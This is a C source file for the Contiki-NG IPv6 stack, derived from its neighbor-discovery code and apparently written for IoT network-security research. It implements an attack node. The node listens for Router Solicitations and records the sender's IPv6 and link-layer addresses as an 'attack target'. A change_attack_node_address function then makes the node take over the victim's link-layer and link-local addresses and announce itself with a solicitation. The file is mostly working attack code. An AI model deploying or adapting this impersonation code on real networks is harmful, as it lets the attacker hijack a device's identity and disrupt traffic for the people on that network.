/*
 * Copyright (C) 1995, 1996, 1997, and 1998 WIDE Project.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the project nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE PROJECT AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE PROJECT OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */
/*
 * Copyright (c) 2006, Swedish Institute of Computer Science.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *   notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the Institute nor the names of its contributors
 *   may be used to endorse or promote products derived from this software
 *   without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE INSTITUTE AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE INSTITUTE OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

/**
 * \addtogroup uip
 * @{
 */

/**
 * \file
 *    Neighbor discovery (RFC 4861)
 * \author Mathilde Durvy <mdurvy@cisco.com>
 * \author Julien Abeille <jabeille@cisco.com>
 */

#include <string.h>
#include <inttypes.h>
#include "net/ipv6/uip-icmp6.h"
#include "net/ipv6/uip-nd6.h"
#include "dev/uip-nd6-att.h"
#include "net/ipv6/uip-ds6.h"
#include "net/ipv6/uip-nameserver.h"
#include "lib/random.h"
#include "net/packetbuf.h"

/* Log configuration */
#include "sys/log.h"
#define LOG_MODULE "IPv6 NDP"
#define LOG_LEVEL LOG_LEVEL_IPV6

/*------------------------------------------------------------------*/
/** @{ */
/** \name Pointers to the header structures.
 */

#if PED_ATT


/**@{  Pointers to messages just after icmp header */
#define UIP_ND6_RS_BUF            ((uip_nd6_rs *)UIP_ICMP_PAYLOAD)
#define UIP_ND6_RA_BUF            ((uip_nd6_ra *)UIP_ICMP_PAYLOAD)
#define UIP_ND6_NS_BUF            ((uip_nd6_ns *)UIP_ICMP_PAYLOAD)
#define UIP_ND6_NA_BUF            ((uip_nd6_na *)UIP_ICMP_PAYLOAD)
/** @} */
/** Pointer to ND option */
#define ND6_OPT(opt)                         ((unsigned char *)(UIP_ICMP_PAYLOAD + (opt)))
#define ND6_OPT_HDR_BUF(opt)               ((uip_nd6_opt_hdr *)ND6_OPT(opt))
#define ND6_OPT_PREFIX_BUF(opt)    ((uip_nd6_opt_prefix_info *)ND6_OPT(opt))
#define ND6_OPT_MTU_BUF(opt)               ((uip_nd6_opt_mtu *)ND6_OPT(opt))
#define ND6_OPT_RDNSS_BUF(opt)             ((uip_nd6_opt_dns *)ND6_OPT(opt))
/** @} */

attack_target_t attack_target;

// static uint8_t nd6_opt_offset;                     /** Offset from the end of the icmpv6 header to the option in uip_buf*/
// static uint8_t *nd6_opt_llao;   /**  Pointer to llao option in uip_buf */
// static uip_ds6_nbr_t *nbr; /**  Pointer to a nbr cache entry*/
// static uip_ds6_addr_t *addr; /**  Pointer to an interface address */

// static uip_ds6_defrt_t *defrt; /**  Pointer to a router list entry */

// static uip_nd6_opt_prefix_info *nd6_opt_prefix_info; /**  Pointer to prefix information option in uip_buf */
// static uip_ipaddr_t ipaddr;

// static uip_ds6_prefix_t *prefix; /**  Pointer to a prefix list entry */

/*------------------------------------------------------------------*/
/* Copy link-layer address from LLAO option to a word-aligned uip_lladdr_t */

#if 0
/* create a llao */
static void
create_llao(uint8_t *llao, uint8_t type) {
  llao[UIP_ND6_OPT_TYPE_OFFSET] = type;
  llao[UIP_ND6_OPT_LEN_OFFSET] = UIP_ND6_OPT_LLAO_LEN >> 3;
  memcpy(&llao[UIP_ND6_OPT_DATA_OFFSET], &uip_lladdr, UIP_LLADDR_LEN);
  /* padding on some */
  memset(&llao[UIP_ND6_OPT_DATA_OFFSET + UIP_LLADDR_LEN], 0,
         UIP_ND6_OPT_LLAO_LEN - 2 - UIP_LLADDR_LEN);
}
#endif

/*------------------------------------------------------------------*/
 /**
 * Neighbor Solicitation Processing
 *
 * The NS can be received in 3 cases (procedures):
 * - sender is performing DAD (ip src = unspecified, no SLLAO option)
 * - sender is performing NUD (ip dst = unicast)
 * - sender is performing address resolution (ip dest = solicited node mcast
 * address)
 *
 * We do:
 * - if the tgt belongs to me, reply, otherwise ignore
 * - if i was performing DAD for the same address, two cases:
 * -- I already sent a NS, hence I win
 * -- I did not send a NS yet, hence I lose
 *
 * If we need to send a NA in response (i.e. the NS was done for NUD, or
 * address resolution, or DAD and there is a conflict), we do it in this
 * function: set src, dst, tgt address in the three cases, then for all cases
 * set the rest, including  SLLAO
 *
 */


/*------------------------------------------------------------------*/
/**
 * Neighbor Advertisement Processing
 *
 * we might have to send a pkt that had been buffered while address
 * resolution was performed (if we support buffering, see UIP_CONF_QUEUE_PKT)
 *
 * As per RFC 4861, on link layer that have addresses, TLLAO options MUST be
 * included when responding to multicast solicitations, SHOULD be included in
 * response to unicast (here we assume it is for now)
 *
 * NA can be received after sending NS for DAD, Address resolution or NUD. Can
 * be unsolicited as well.
 * It can trigger update of the state of the neighbor in the neighbor cache,
 * router in the router list.
 * If the NS was for DAD, it means DAD failed
 *
 */



/*---------------------------------------------------------------------------*/

static void
rs_att_input(void)
{

  LOG_INFO("Received RS1 from ");
  LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  LOG_INFO_(" to ");
  LOG_INFO_6ADDR(&UIP_IP_BUF->destipaddr);
  LOG_INFO_("\n");
  UIP_STAT(++uip_stat.nd6.recv);

  attack_target.ipaddr = UIP_IP_BUF->srcipaddr;
  attack_target.lladdr = *packetbuf_addr(PACKETBUF_ADDR_SENDER);

  LOG_INFO("LINK: ");
  LOG_INFO_LLADDR(&attack_target.lladdr);
  LOG_INFO("\n");


  uipbuf_clear();
  return;
}

#if 0
void
uip_nd6_ra_att_output(uip_ipaddr_t * dest)
{

  UIP_IP_BUF->vtc = 0x60;
  UIP_IP_BUF->tcflow = 0;
  UIP_IP_BUF->flow = 0;
  UIP_IP_BUF->proto = UIP_PROTO_ICMP6;
  UIP_IP_BUF->ttl = UIP_ND6_HOP_LIMIT;

  if(dest == NULL) {
    uip_create_linklocal_allnodes_mcast(&UIP_IP_BUF->destipaddr);
  } else {
    /* For sollicited RA */
    uip_ipaddr_copy(&UIP_IP_BUF->destipaddr, dest);
  }
  uip_ds6_select_src(&UIP_IP_BUF->srcipaddr, &UIP_IP_BUF->destipaddr);

  UIP_ICMP_BUF->type = ICMP6_RA;
  UIP_ICMP_BUF->icode = 0;

  UIP_ND6_RA_BUF->cur_ttl = uip_ds6_if.cur_hop_limit;

  UIP_ND6_RA_BUF->flags_reserved =
    (UIP_ND6_M_FLAG << 7) | (UIP_ND6_O_FLAG << 6);

  UIP_ND6_RA_BUF->router_lifetime = uip_htons(UIP_ND6_ROUTER_LIFETIME);
  //UIP_ND6_RA_BUF->reachable_time = uip_htonl(uip_ds6_if.reachable_time);
  //UIP_ND6_RA_BUF->retrans_timer = uip_htonl(uip_ds6_if.retrans_timer);
  UIP_ND6_RA_BUF->reachable_time = 0;
  UIP_ND6_RA_BUF->retrans_timer = 0;

  uip_len = UIP_IPH_LEN + UIP_ICMPH_LEN + UIP_ND6_RA_LEN;
  nd6_opt_offset = UIP_ND6_RA_LEN;


  /* Prefix list */
  for(prefix = uip_ds6_prefix_list;
      prefix < uip_ds6_prefix_list + UIP_DS6_PREFIX_NB; prefix++) {
    if((prefix->isused) && (prefix->advertise)) {
      ND6_OPT_PREFIX_BUF(nd6_opt_offset)->type = UIP_ND6_OPT_PREFIX_INFO;
      ND6_OPT_PREFIX_BUF(nd6_opt_offset)->len = UIP_ND6_OPT_PREFIX_INFO_LEN / 8;
      ND6_OPT_PREFIX_BUF(nd6_opt_offset)->preflen = prefix->length;
      ND6_OPT_PREFIX_BUF(nd6_opt_offset)->flagsreserved1 = prefix->l_a_reserved;
      ND6_OPT_PREFIX_BUF(nd6_opt_offset)->validlt = uip_htonl(prefix->vlifetime);
      ND6_OPT_PREFIX_BUF(nd6_opt_offset)->preferredlt = uip_htonl(prefix->plifetime);
      ND6_OPT_PREFIX_BUF(nd6_opt_offset)->reserved2 = 0;
      uip_ipaddr_copy(&(ND6_OPT_PREFIX_BUF(nd6_opt_offset)->prefix), &(prefix->ipaddr));
      nd6_opt_offset += UIP_ND6_OPT_PREFIX_INFO_LEN;
      uip_len += UIP_ND6_OPT_PREFIX_INFO_LEN;
    }
  }

  /* Source link-layer option */
  create_llao((uint8_t *)ND6_OPT_HDR_BUF(nd6_opt_offset), UIP_ND6_OPT_SLLAO);

  uip_len += UIP_ND6_OPT_LLAO_LEN;
  nd6_opt_offset += UIP_ND6_OPT_LLAO_LEN;

  /* MTU */
  ND6_OPT_MTU_BUF(nd6_opt_offset)->type = UIP_ND6_OPT_MTU;
  ND6_OPT_MTU_BUF(nd6_opt_offset)->len = UIP_ND6_OPT_MTU_LEN >> 3;
  ND6_OPT_MTU_BUF(nd6_opt_offset)->reserved = 0;
  //ND6_OPT_MTU_BUF(nd6_opt_offset)->mtu = uip_htonl(uip_ds6_if.link_mtu);
  ND6_OPT_MTU_BUF(nd6_opt_offset)->mtu = uip_htonl(1500);

  uip_len += UIP_ND6_OPT_MTU_LEN;
  nd6_opt_offset += UIP_ND6_OPT_MTU_LEN;

#if UIP_ND6_RA_RDNSS
  if(uip_nameserver_count() > 0) {
    uint8_t i = 0;
    uip_ipaddr_t *ip = &ND6_OPT_RDNSS_BUF(nd6_opt_offset)->ip;
    uip_ipaddr_t *dns = NULL;
    ND6_OPT_RDNSS_BUF(nd6_opt_offset)->type = UIP_ND6_OPT_RDNSS;
    ND6_OPT_RDNSS_BUF(nd6_opt_offset)->reserved = 0;
    ND6_OPT_RDNSS_BUF(nd6_opt_offset)->lifetime = uip_nameserver_next_expiration();
    if(ND6_OPT_RDNSS_BUF(nd6_opt_offset)->lifetime != UIP_NAMESERVER_INFINITE_LIFETIME) {
      ND6_OPT_RDNSS_BUF(nd6_opt_offset)->lifetime -= clock_seconds();
    }
    while((dns = uip_nameserver_get(i)) != NULL) {
      uip_ipaddr_copy(ip++, dns);
      i++;
    }
    ND6_OPT_RDNSS_BUF(nd6_opt_offset)->len = UIP_ND6_OPT_RDNSS_LEN + (i << 1);
    LOG_INFO("%d nameservers reported\n", i);
    uip_len += ND6_OPT_RDNSS_BUF(nd6_opt_offset)->len << 3;
    nd6_opt_offset += ND6_OPT_RDNSS_BUF(nd6_opt_offset)->len << 3;
  }
#endif /* UIP_ND6_RA_RDNSS */

  uipbuf_set_len_field(UIP_IP_BUF, uip_len - UIP_IPH_LEN);

  /*ICMP checksum */
  UIP_ICMP_BUF->icmpchksum = 0;
  UIP_ICMP_BUF->icmpchksum = ~uip_icmp6chksum();

  UIP_STAT(++uip_stat.nd6.sent);
  LOG_INFO("Sending RA to ");
  LOG_INFO_6ADDR(&UIP_IP_BUF->destipaddr);
  LOG_INFO_(" from ");
  LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  LOG_INFO_("\n");
  return;
}
#endif

/*---------------------------------------------------------------------------*/
/*---------------------------------------------------------------------------*/
/**
 * Process a Router Advertisement
 *
 * - Possible actions when receiving a RA: add router to router list,
 *   recalculate reachable time, update link hop limit, update retrans timer.
 * - If MTU option: update MTU.
 * - If SLLAO option: update entry in neighbor cache
 * - If prefix option: start autoconf, add prefix to prefix list
 */

/*------------------------------------------------------------------*/
/* ICMPv6 input handlers */

UIP_ICMP6_HANDLER(rs_input_handler, ICMP6_RS, UIP_ICMP6_HANDLER_CODE_ANY,
                  rs_att_input);

/*---------------------------------------------------------------------------*/
void
uip_nd6_att_init()
{

  /* Only accept RS if we are a router and happy to send out RAs */
  uip_icmp6_register_input_handler(&rs_input_handler);
  LOG_INFO("REGISTERED RS input \n");

  uip_create_unspecified(&attack_target.ipaddr);

}

attack_target_t 
get_attack_target(){
  return attack_target;
}

void print_attk_tgt_addr(void)
{
  LOG_INFO("Target addr: ");
  LOG_INFO_6ADDR(&attack_target.ipaddr);
  LOG_INFO("\n");
}

void
change_attack_node_address(){/* 
  uint16_t cser = curr_pednet_instance.cser;
  uint16_t csr = curr_pednet_instance.csr; */
  LOG_INFO("change_attack_node_address \n");
  linkaddr_copy(&linkaddr_node_addr, &attack_target.lladdr);

  uip_ipaddr_t ipaddr = uip_ds6_get_link_local(-1)->ipaddr;
  uip_ds6_addr_rm(uip_ds6_addr_lookup(&ipaddr));

  LOG_INFO("adding link local address ");
  LOG_INFO_6ADDR(&ipaddr);
  LOG_INFO("\n");
  uip_ds6_addr_add(&attack_target.ipaddr, 0, ADDR_AUTOCONF);


  
  uip_ds6_send_rs();
  LOG_INFO("PAC: Attacker Address changed! \n");
}

/*---------------------------------------------------------------------------*/
 /** @} */
#endif